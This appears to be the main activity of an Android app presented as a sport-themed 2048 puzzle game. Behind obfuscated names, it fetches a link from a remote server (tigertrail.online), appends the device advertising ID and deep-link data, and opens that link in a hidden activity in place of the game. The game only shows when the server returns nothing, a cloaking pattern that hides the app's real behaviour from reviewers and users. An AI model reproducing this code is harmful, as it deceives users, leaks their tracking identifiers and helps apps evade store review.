package game.matchtwo.sportbm

import android.content.Context
import android.content.Intent
import android.content.pm.ActivityInfo
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.Image
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material3.Icon
import androidx.compose.material3.Text
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.MutableState
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.layout.ContentScale
import androidx.compose.ui.res.painterResource
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.view.WindowCompat
import androidx.core.view.WindowInsetsCompat
import androidx.core.view.WindowInsetsControllerCompat
import androidx.navigation.compose.NavHost
import androidx.navigation.compose.composable
import androidx.navigation.compose.rememberNavController
import com.facebook.FacebookSdk
import com.facebook.appevents.AppEventsLogger
import com.facebook.applinks.AppLinkData
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.onesignal.OneSignal
import game.matchtwo.sportbm.ui.theme.Sport2048GameTheme
import game.matchtwo.sportbm.yespye.BochonkiGame
import game.matchtwo.sportbm.yespye.codesi.iqjwruhqwruqwuri2
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.jsoup.Jsoup
const val rwqhriqwirhwqhiwrhi = "f7b0c350-46ef-4fac-a298-0d9a3aacc250"
class IhujhufUHFWQqowoe : ComponentActivity() {
    val link = "https://tigertrail.online/pyS"
    private var combinedLink: String? = null
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val jiqwrihqiwr28r2h8 = WindowCompat.getInsetsController(window,window.decorView)
        jiqwrihqiwr28r2h8.systemBarsBehavior = WindowInsetsControllerCompat.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
        jiqwrihqiwr28r2h8.hide(WindowInsetsCompat.Type.systemBars())
        FacebookSdk.sdkInitialize(applicationContext);
        AppEventsLogger.activateApp(application);
        OneSignal.initWithContext(this, rwqhriqwirhwqhiwrhi)

        val ijqfjhuwiqwhruwqr = getSavedCombinedLink()
        if (ijqfjhuwiqwhruwqr != null) {
            val qwuirhyqwriu2 = Intent(
                this@IhujhufUHFWQqowoe,
                iqjwruhqwruqwuri2::class.java
            )
            qwuirhyqwriu2.putExtra("LLL_EXTRA", ijqfjhuwiqwhruwqr)
            CoroutineScope(Dispatchers.Default).launch{
                delay(1000)
                startActivity(qwuirhyqwriu2)
                finish()
            }
            return
        } else {
            AppLinkData.fetchDeferredAppLinkData(applicationContext) { appLinkData ->
                val iqjwirqwuhrqwrurq = appLinkData?.targetUri?.host
                CoroutineScope(Dispatchers.IO).launch {
                    val hqwruhqwurqw7yru = fetchHtmlContent(link)
                    if (hqwruhqwurqw7yru.isNotEmpty()) {
                        val uyqgwrgygwqruwq = fetchAdvertisingId()
                        combinedLink = combineLinks(iqjwirqwuhrqwrurq, uyqgwrgygwqruwq, hqwruhqwurqw7yru)
                        saveCombinedLink(combinedLink)

                        val hquwrhiuhqwruhqwir2 = Intent(
                            this@IhujhufUHFWQqowoe,
                            iqjwruhqwruqwuri2::class.java
                        )
                        hquwrhiuhqwruhqwir2.putExtra("LLL_EXTRA", combinedLink)
                        delay(1000)
                        withContext(Dispatchers.Main){
                            startActivity(hquwrhiuhqwruhqwir2)
                            finish()
                        }

                    }
                    else{
                        OneSignal.User.pushSubscription.optOut()
                    }
                }
            }
        }
        setContent {
            Sport2048GameTheme {
                val bestScore = remember {
                    mutableStateOf(0)
                }
                val score = remember {
                    mutableStateOf(0)
                }
                val currentScore = remember {
                    mutableStateOf(0)
                }
                val refresh = remember {
                    mutableStateOf(false)
                }
                val revert: MutableState<Boolean> = remember {
                    mutableStateOf(false)
                }

                val navController = rememberNavController()
                NavHost(navController = navController, startDestination = "Load" ){
                    composable("Load"){
                            LaunchedEffect(key1 = Unit, block = {
                                delay(790)
                                navController.navigate("Main"){popUpTo(0)}
                            })
                        Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                            Image(
                                painter = painterResource(id = R.drawable.splash),
                                contentDescription = "",
                                modifier = Modifier.fillMaxSize(),
                                contentScale = ContentScale.Crop
                            )
                            Text(text = "Loading, please wait...",
                                fontSize = 24.sp,
                                color = Color(0xFFEEEBEB)
                            )
                        }
                    }
                    composable("Main"){
                        Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center){
                            Image(painter = painterResource(id = R.drawable.maskgroup),
                                contentDescription = "",
                                modifier = Modifier.fillMaxSize(),
                                contentScale = ContentScale.Crop)
                            this@IhujhufUHFWQqowoe.requestedOrientation = ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE
                            BochonkiGame(refresh,currentScore,bestScore,revert,score)


                                Column(horizontalAlignment = Alignment.CenterHorizontally,
                                    verticalArrangement = Arrangement.spacedBy(4.dp),
                                    modifier = Modifier.align(Alignment.BottomStart).padding(16.dp).background(Color(0xFF5A3908), RoundedCornerShape(30))
                                        .border(1.dp, Color(0xFF8B5200), RoundedCornerShape(30))
                                        .padding(4.dp)
                                        .clip(RoundedCornerShape(30)).padding(10.dp).clickable{ refresh.value = !refresh.value}){
                                    Icon(painter = painterResource(id = R.drawable.round_autorenew_24), contentDescription = "",
                                        tint = Color.White,
                                        modifier = Modifier)
                                    Text(text = "refresh",
                                        fontSize = 14.sp,
                                        fontFamily = FontFamily.Serif,
                                        color = Color(0xFFF5F1F1))

                                }



                            Column(modifier = Modifier
                                .align(Alignment.TopEnd)
                                .padding(16.dp),
                                horizontalAlignment = Alignment.CenterHorizontally,
                                verticalArrangement = Arrangement.spacedBy(4.dp)) {
                                Text(text = "Best score: ${bestScore.value}",
                                    fontSize = 24.sp,
                                    fontFamily = FontFamily.Serif,
                                    color = Color(0xFFF5F1F1),
                                    modifier = Modifier
                                        .background(Color(0xFF5A3908), RoundedCornerShape(20))
                                        .border(1.dp, Color(0xFF8B5200), RoundedCornerShape(20))
                                        .padding(4.dp))

                                Text(text = "Current score: ${currentScore.value}",
                                    fontSize = 24.sp,
                                    fontFamily = FontFamily.Serif,
                                    color = Color(0xFFF5F1F1),
                                    modifier = Modifier
                                        .background(Color(0xFF5A3908), RoundedCornerShape(20))
                                        .border(1.dp, Color(0xFF8B5200), RoundedCornerShape(20))
                                        .padding(4.dp))


                            }

                        }

                    }
                }


            }
        }
    }
    private fun saveCombinedLink(link: String?) {
        val sharedPreferences = getSharedPreferences("MyPrefs", Context.MODE_PRIVATE)
        val editor = sharedPreferences.edit()
        editor.putString("combinedLink", link)
        editor.apply()
    }

    private fun getSavedCombinedLink(): String? {
        val sharedPreferences = getSharedPreferences("MyPrefs", Context.MODE_PRIVATE)
        return sharedPreferences.getString("combinedLink", null)
    }


    private fun combineLinks(
        deepLinkHost: String?,
        advertisingId: String?,
        extractedText: String
    ): String {
        return "$extractedText$advertisingId&c=$deepLinkHost"
    }

    private suspend fun fetchAdvertisingId(): String? {
        return withContext(Dispatchers.IO) {
            try {
                val adInfo = AdvertisingIdClient.getAdvertisingIdInfo(applicationContext)
                adInfo.id
            } catch (e: Exception) {
                e.message
            }
        }
    }


    private suspend fun fetchHtmlContent(url: String): String = withContext(Dispatchers.IO) {
        return@withContext try {
            Jsoup.connect(url).get().text()
        } catch (e: Exception) {
            ""
        }
    }

}

